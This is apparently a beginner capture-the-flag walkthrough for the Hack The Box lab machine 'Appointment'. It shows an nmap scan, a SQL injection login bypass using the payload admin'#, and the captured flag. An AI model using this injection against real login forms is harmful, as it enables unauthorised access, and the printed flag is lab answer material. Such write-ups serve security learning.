## 🗓️ HTB Starting Point: Appointment  
**Level**: Very Easy  
**Date**: July 29, 2025  
**Goal**: Bypass a vulnerable login page using SQL injection to retrieve the flag.

---

### 🧰 Tools  
- `nmap`  
- Web browser  

---

### 🧭 Steps  

1. 🔎 **Scan port 80** with version detection:
   nmap -sS -sV -p 80 10.129.X.X

---

### Output
```PORT   STATE SERVICE VERSION  
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
```

---

2. 🌐 **Open the web page** in a browser:  
   Navigate to `http://10.129.X.X`  
   A login form is displayed.

---

3. 🧪 **Bypass login using SQL Injection**:  
```
   Username:admin'#
   Password: anything  
   ```

   → Login successful — redirected to the flag page.

---

4. 🏁 **Retrieve the flag from the page**:
`HTB{e3d0796d002a446c0e622226f42e9672}`

---

### 💣 Payloads Used  
```
nmap -sS -sV -p 80 10.129.X.X  
# Browser-based SQLi:  
# Username: admin'#  
# Password: anything
```

